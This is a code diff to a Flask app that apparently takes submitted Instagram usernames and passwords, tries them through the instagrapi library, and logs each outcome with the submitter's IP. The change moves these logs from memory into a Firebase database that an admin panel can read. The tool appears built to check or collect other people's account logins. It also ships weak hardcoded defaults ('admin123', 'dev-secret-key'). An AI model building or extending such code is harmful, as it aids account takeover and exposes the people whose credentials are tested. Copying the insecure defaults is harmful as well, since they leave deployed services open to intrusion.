@@ -16,6 +16,8 @@ from instagrapi.exceptions import (
     SelectContactPointRecoveryForm,
     TwoFactorRequired,
 )
+import firebase_admin
+from firebase_admin import credentials, db
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")
@@ -23,20 +25,62 @@ app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
 
 # ============================================
-# IN-MEMORY STORAGE (temporary, logs will disappear on restart)
+# FIREBASE ADMIN SDK SETUP
 # ============================================
-logs_memory = []
+
+# Get Firebase credentials from environment variables
+firebase_private_key = os.environ.get("FIREBASE_PRIVATE_KEY")
+if firebase_private_key:
+    # Handle the case where the key has \n in it
+    firebase_private_key = firebase_private_key.replace('\\n', '\n')
+
+# Build the credential dictionary from environment variables
+cred_dict = {
+    "type": os.environ.get("FIREBASE_TYPE", "service_account"),
+    "project_id": os.environ.get("FIREBASE_PROJECT_ID"),
+    "private_key_id": os.environ.get("FIREBASE_PRIVATE_KEY_ID"),
+    "private_key": firebase_private_key,
+    "client_email": os.environ.get("FIREBASE_CLIENT_EMAIL"),
+    "client_id": os.environ.get("FIREBASE_CLIENT_ID"),
+    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+    "token_uri": "https://oauth2.googleapis.com/token",
+    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+    "client_x509_cert_url": os.environ.get("FIREBASE_CLIENT_CERT_URL"),
+    "universe_domain": "googleapis.com"
+}
+
+# Initialize Firebase Admin SDK
+cred = credentials.Certificate(cred_dict)
+firebase_admin.initialize_app(cred, {
+    'databaseURL': os.environ.get("FIREBASE_DATABASE_URL")
+})
+
+print("✅ Firebase Admin SDK initialized successfully!")
 
 def load_logs():
-    """Load logs from in-memory storage"""
-    return logs_memory
+    """Load logs from Firebase Realtime Database"""
+    try:
+        ref = db.reference('logs')
+        logs_data = ref.order_by_key().limit_to_last(500).get()
+        if logs_data:
+            # Convert Firebase object to list
+            logs_list = []
+            for key, value in logs_data.items():
+                logs_list.append(value)
+            return logs_list[::-1]  # Reverse to show newest first
+        return []
+    except Exception as e:
+        print(f"Error loading logs: {e}")
+        return []
 
 def save_log(entry):
-    """Save log to in-memory storage"""
-    logs_memory.insert(0, entry)
-    # Keep only last 500 entries
-    if len(logs_memory) > 500:
-        logs_memory.pop()
+    """Save log to Firebase Realtime Database"""
+    try:
+        ref = db.reference('logs')
+        ref.push(entry)  # Push creates a unique key
+        print(f"✅ Log saved to Firebase: {entry['username']} - {entry['status']}")
+    except Exception as e:
+        print(f"❌ Error saving log to Firebase: {e}")
 
 def require_admin(f):
     @functools.wraps(f)
@@ -64,9 +108,13 @@ def admin():
 @app.route("/admin/clear", methods=["POST"])
 @require_admin
 def admin_clear():
-    global logs_memory
-    logs_memory = []
-    return ("", 204)
+    try:
+        ref = db.reference('logs')
+        ref.delete()
+        return ("", 204)
+    except Exception as e:
+        print(f"Error clearing logs: {e}")
+        return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route("/check", methods=["POST"])
 def check_credentials():
@@ -155,8 +203,8 @@ def check_credentials():
             "message": result.get("message", ""),
             "ip": request.remote_addr,
         })
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Error saving log: {e}")
 
     return jsonify(result)
 
